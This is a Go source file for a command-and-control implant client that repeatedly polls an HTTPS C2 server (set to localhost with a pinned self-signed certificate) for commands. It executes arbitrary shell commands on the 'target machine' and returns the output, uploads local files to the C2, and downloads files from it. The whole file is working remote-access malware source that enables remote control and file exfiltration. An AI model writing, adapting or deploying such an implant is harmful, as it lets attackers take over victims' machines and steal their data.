package main

import (
	"bytes"
	"crypto/tls"
	"crypto/x509"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"mime/multipart"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

//go:generate go-bindata -o resources.go resources/...

// constants
const certPath = "resources" + string(os.PathSeparator) + "server.crt"
const host = "https://localhost"
const port = 4433
const getCmdURL = "/getcmd"
const cmdOutputURL = "/cmdoutput"
const uploadFileURL = "/upload"
const downloadFileURL = "/download"

// SetupClient sets up the client object with the self-signed cert
// and returns it.
func SetupClient() *http.Client {
	// set up own cert pool
	tlsConfig := &tls.Config{RootCAs: x509.NewCertPool()}
	transport := &http.Transport{TLSClientConfig: tlsConfig}
	client := &http.Client{Transport: transport}

	// load trusted cert path
	caCert, err := Asset(certPath)
	if err != nil {
		panic(err)
	}
	ok := tlsConfig.RootCAs.AppendCertsFromPEM(caCert)
	if !ok {
		panic("Couldn't load cert file")
	}

	return client
}

// AskForCmd sends a HTTPS GET request to the c2 server's
// /getCmd endpoint and returns the parsed command string.
func AskForCmd(client *http.Client, url string) string {
	fmt.Println("[+] Calling home to c2 to get cmd...")
	resp, err := client.Get(url)
	if err != nil {
		fmt.Printf("[-] Got error when requesting cmd: %s", err)
	}
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Printf("[-] Error while reading body of request: %s", err)
	}
	fmt.Printf("[+] Got cmd from backend:\n%s\n", body)

	return strings.Trim(string(body), " \n")
}

// ProcessCmd splits of the flow corresponding to the cmd
// string and delegates to the method that is repsonsible for
// taking out the action.
func ProcessCmd(client *http.Client, cmd string, host string) {
	if strings.Compare(cmd, "quit") == 0 {
		fmt.Println("[+] Quitting due to quit cmd from c2")
		os.Exit(0)
	} else if strings.Contains(cmd, "upload") {
		cmdTokens := strings.Split(cmd, " ")
		localFilePath := cmdTokens[1]
		remoteFilePath := cmdTokens[2]
		UploadFile(client, host+uploadFileURL, localFilePath, remoteFilePath)
	} else if strings.Contains(cmd, "download") {
		cmdTokens := strings.Split(cmd, " ")
		remoteFilePath := cmdTokens[1]
		localFilePath := cmdTokens[2]
		DownloadFile(client, host+downloadFileURL+"?file="+remoteFilePath, localFilePath)
	} else {
		out := ExecAndGetOutput(string(cmd))
		fmt.Printf("[+] Sending back output:\n%s\n", string(out))
		client.Post(host+cmdOutputURL, "text/html", bytes.NewBuffer(out))
	}
}

// UploadFile uploads a local file on the target machine to the c2.
func UploadFile(client *http.Client, url string, localFilePath string, remoteFilePath string) {
	// open the file of interest
	file, err := os.Open(localFilePath)
	if err != nil {
		fmt.Printf("[-] Error opening file: %s\n", err)
		return
	}
	defer file.Close()

	// create the form file
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	part, err := writer.CreateFormFile("uploadFile", filepath.Base(remoteFilePath))
	if err != nil {
		fmt.Printf("[-] Error creating form file: %s\n", err)
		return
	}
	_, err = io.Copy(part, file)
	err = writer.Close()
	if err != nil {
		fmt.Printf("[-] Error closing the multipart writer: %s\n", err)
		return
	}

	// create the request
	req, err := http.NewRequest("POST", url, body)
	req.Header.Set("Content-Type", writer.FormDataContentType())
	if err != nil {
		fmt.Printf("[-] Error creating the request: %s\n", err)
		return
	}

	// send it off
	_, err = client.Do(req)
	if err != nil {
		fmt.Printf("[-] Error sending upload request: %s\n", err)
		return
	}
	fmt.Println("[+] Uploaded file.")
}

// DownloadFile downloads a file from the c2 to the local target machine.
func DownloadFile(client *http.Client, url string, filePath string) {
	// get the file data
	fmt.Println(url)
	resp, err := client.Get(url)
	if err != nil {
		fmt.Printf("[-] Error getting file to download from c2: %s\n", err)
		return
	}
	defer resp.Body.Close()

	// create downloads dir if not existant yet
	_ = os.Mkdir("downloads", 0755)
	// create local file
	out, err := os.Create("downloads/" + filePath)
	if err != nil {
		fmt.Printf("[-] Error creating local file: %s\n", err)
		return
	}
	defer out.Close()

	// and write data to it
	_, err = io.Copy(out, resp.Body)
	if err != nil {
		fmt.Printf("[-] Error writing to local file: %s\n", err)
		return
	}
	fmt.Println("[+] Successfully downloaded file")
}

// ExecAndGetOutput executes the command string on the OS
// and returns the combined output.
func ExecAndGetOutput(cmdString string) []byte {
	fmt.Println("[+] Executing cmd...")
	cmdTokens := strings.Split(cmdString, " ")
	cmd := exec.Command(cmdTokens[0], cmdTokens[1:]...)
	out, err := cmd.CombinedOutput()
	if err != nil {
		log.Fatalf("cmd.Run() failed with %s\n", err)
	}
	return out
}

// main entry point
func main() {
	hoststr := fmt.Sprintf("%s:%d", host, port)
	client := SetupClient()

	// endless loop until quit cmd from c2
	for {
		cmd := AskForCmd(client, hoststr+getCmdURL)
		ProcessCmd(client, cmd, hoststr)
	}
}
